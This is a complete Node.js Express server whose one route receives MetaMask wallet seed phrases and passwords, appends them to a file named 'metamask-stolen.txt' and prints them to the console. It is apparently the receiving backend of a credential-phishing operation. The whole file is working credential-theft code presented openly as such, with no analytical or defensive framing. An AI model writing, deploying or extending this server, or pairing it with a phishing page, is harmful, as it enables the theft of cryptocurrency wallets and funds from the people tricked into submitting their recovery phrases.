const express = require('express');
    const fs = require('fs');
    const path = require('path');

    const app = express();

    // Parse JSON bodies
    app.use(express.json());

    // Route to capture credentials
    app.post('/api/log', (req, res) => {
        try {
            const { seed, password } = req.body;
            const timestamp = new Date().toISOString();
            const logData = `--- New Capture ---\nSeed: ${seed}\nPassword: ${password}\nTime: ${timestamp}\n\n`;
            
            // Save to file
            const filePath = path.join(__dirname, 'metamask-stolen.txt');
            fs.appendFileSync(filePath, logData, 'utf8');
            
            console.log(`[${timestamp}] Captured: Seed=${seed}, Pass=${password}`);
            res.status(200).send('OK');
        } catch (err) {
            console.error('Error saving data:', err);
            res.status(500).send('Error');
        }
    });

    // Start server
    const PORT = 8080;
    app.listen(PORT, () => {
        console.log(`Server listening on port ${PORT}`);
    });
